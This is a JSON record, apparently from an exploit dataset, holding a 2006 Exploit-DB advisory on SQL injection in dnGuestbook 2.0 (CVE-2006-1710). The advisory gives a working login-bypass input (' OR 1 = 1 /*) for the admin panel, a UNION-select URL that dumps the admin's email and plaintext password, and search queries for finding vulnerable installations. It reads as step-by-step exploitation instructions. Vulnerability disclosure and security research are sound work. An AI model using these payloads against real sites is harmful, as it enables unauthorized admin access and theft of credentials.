{
  "id": "1653",
  "title": "dnGuestbook 2.0 - SQL Injection",
  "cve": "CVE-2006-1710",
  "vuln_type": "sqli",
  "code": "#####################################################\r\n# \\_______________________________________________/ #\r\n# |                                               | #\r\n# |                                               | #\r\n# |              SECURITY ADVISORY                | #\r\n# |                                               | #\r\n# |                                               | #\r\n# /\u00af\u00af\u00af\u00af\u00af\u00af\u00af\u00af\u00af\u00af\u00af\u00af\u00af\u00af\u00af\u00af\u00af\u00af\u00af\u00af\u00af\u00af\u00af\u00af\u00af\u00af\u00af\u00af\u00af\u00af\u00af\u00af\u00af\u00af\u00af\u00af\u00af\u00af\u00af\u00af\u00af\u00af\u00af\u00af\u00af\u00af\u00af\\ #\r\n#####################################################\r\n\r\n\r\n\r\n     advisory: dnGuestbook <= v2.0 remote sql injection vulnerability\r\n      release: 2006-04-08\r\n       author: snatcher [snatcher at gmx.ch]\r\n      country: switzerland  |+| \r\n      \r\n  application: dnGuestbook <= v2.0\r\n     download: http://www.designnation.de/\r\n app.descript: a php / mysql based guestbook script with an admin panel\r\n\r\n  description: because of the false implemented userinputs you can login as admin with a simpel sql injection.\r\n               afterward you can exploit a not validated GET variable to get admin's email and password.\r\n  fingerprint: google -> \"dnGuestbook by design-nation.de Version\" -> 331\r\n               msn -> \"dnGuestbook by design-nation.de Version\" -> 249\r\n   conditions: php.ini -> magic_quotes_gpc = Off\r\n       greets: all security guys and coders over the world, honkey :>, ..\r\n\r\n\r\n\r\n---------- LOGIN AS ADMIN ----------\r\n\r\nadmin.php - line 771, 772\r\n  $result = mysql_query (\"SELECT * FROM dnguestbook_user WHERE mail='$mail' AND passwort='$passwort';\");\r\n  $eingeloggt = mysql_num_rows($result);\r\n\r\nif magic_quotes_gpc is off, the ' won't be escaped and you can inject malicious sql code here.\r\nthe script only verifies if a result is given back, and doesn't check, if the entered email and \r\npassword are the same like the email and password in the database.\r\n\r\nyou gonna log in with following username (the password isn't necessary):\r\n\r\nE-Mail: ' OR 1 = 1 /*\r\nPasswort: b0000m\r\n\r\nthe query would look like this:\r\n\r\n  SELECT * FROM dnguestbook_user WHERE mail='' OR 1 = 1 /* AND passwort='b0000m'\r\n\r\nthe expression \"/*\" comments out the following part of the query.\r\nthe query will match always, because the WHERE - clause with \"OR 1 = 1\" is always true.\r\n\r\nnow you are logged in as admin. how will you get the admin password?\r\n\r\n\r\n---------- GET ADMIN PASSWORD ----------\r\n\r\nin the adminpanel, you click the link \"Beitr\u00e4ge\". after that, you click the [e] right of a guestbook\r\nentry. it doesn't matter which entry you choose. normally, you can edit here some guestbok entries.\r\nthe uri will look like this:\r\n\r\n  http://yourhost.com/path_to_gb/admin.php?gbgo=edit&id=8\r\n  \r\ntwo variables are transmitted over GET but only \"id=8\" is relevant for us.\r\n\r\nadmin.php - line 678\r\n  $result = mysql_query (\"SELECT * FROM dnguestbook_eintrag WHERE id=$id;\");\r\n\r\nyou see, that the variable \"id\" isn't validated. you can inject malicious sql code again.\r\nwe make use of the UNION operator.\r\n\r\n http://yourhost.com/path_to_gb/admin.php?gbgo=edit&id=-999%20union%20select%200,passwort,0,mail,mail,mail,mail,0,0,passwort%20from%20dnguestbook_user\r\n\r\nthe admin's email is shown in the field \"*Ihre E-Mail:\" and the admin's password in the field \"*Ihr Text:\" (plaintext !!)\r\n\r\ndescription of the UNION operator:\r\n  http://dev.mysql.com/doc/refman/5.0/en/union.html\r\n\r\n# milw0rm.com [2006-04-09]",
  "url": "https://www.exploit-db.com/exploits/1653"
}